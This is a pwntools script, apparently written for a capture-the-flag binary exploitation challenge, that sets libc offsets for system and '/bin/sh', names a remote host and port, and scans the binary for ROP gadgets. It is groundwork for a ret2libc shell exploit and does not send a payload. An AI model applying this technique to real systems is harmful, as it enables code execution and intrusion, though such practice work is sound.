from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('d:/iscc/pwn2/pwn_permission')

HOST = '39.96.193.120'
PORT = 10000

SYSTEM_OFFSET = 0x41360
BINSH_OFFSET = 0x18c363
PUTS_OFFSET = 0x6d1e0

write_plt = elf.plt['write']
vuln_addr = elf.symbols['vuln']
puts_got = elf.got['puts']
target_val_addr = 0x804c030

print("=== Verifying gadgets ===")

ret_candidate = 0x0804901e
b = elf.read(ret_candidate, 1)
print(f"  0x{ret_candidate:x}: {b[0]:02x} {'ret' if b[0] == 0xc3 else 'NOT ret'}")

for addr in [0x0804901e, 0x0804901f, 0x08049020, 0x08049000, 0x0804903e, 0x0804938e]:
    b = elf.read(addr, 1)
    if b[0] == 0xc3:
        print(f"  0x{addr:x}: c3 -> ret gadget CONFIRMED")
    else:
        print(f"  0x{addr:x}: {b[0]:02x} -> not ret")

pop4_ret = 0x08049380
b = elf.read(pop4_ret, 6)
print(f"  0x{pop4_ret:x}: {' '.join(f'{x:02x}' for x in b)}")
print(f"    Expected: 5b 5e 5f 5d c3 (pop ebx; pop esi; pop edi; pop ebp; ret)")

leave_ret = 0x0804926e
b = elf.read(leave_ret, 2)
print(f"  0x{leave_ret:x}: {' '.join(f'{x:02x}' for x in b)}")
print(f"    Expected: c9 c3 (leave; ret)")

print("\n=== Searching for ret gadgets ===")
text_start = 0x08049000
text_end = 0x0804a000
text = elf.read(text_start, text_end - text_start)

ret_gadgets = []
for i in range(len(text)):
    if text[i] == 0xc3:
        addr = text_start + i
        ret_gadgets.append(addr)

print(f"  Found {len(ret_gadgets)} ret gadgets")
for addr in ret_gadgets[:20]:
    print(f"    0x{addr:x}")

print("\n=== Searching for pop eax; ret gadgets ===")
for i in range(len(text) - 1):
    if text[i] == 0x58 and text[i+1] == 0xc3:
        addr = text_start + i
        print(f"  pop eax; ret at 0x{addr:x}")

print("\n=== Searching for int 0x80 gadgets ===")
for i in range(len(text) - 1):
    if text[i] == 0xcd and text[i+1] == 0x80:
        addr = text_start + i
        print(f"  int 0x80 at 0x{addr:x}")

print("\n=== Searching for call eax gadgets ===")
for i in range(len(text) - 1):
    if text[i] == 0xff and text[i+1] == 0xd0:
        addr = text_start + i
        print(f"  call eax at 0x{addr:x}")
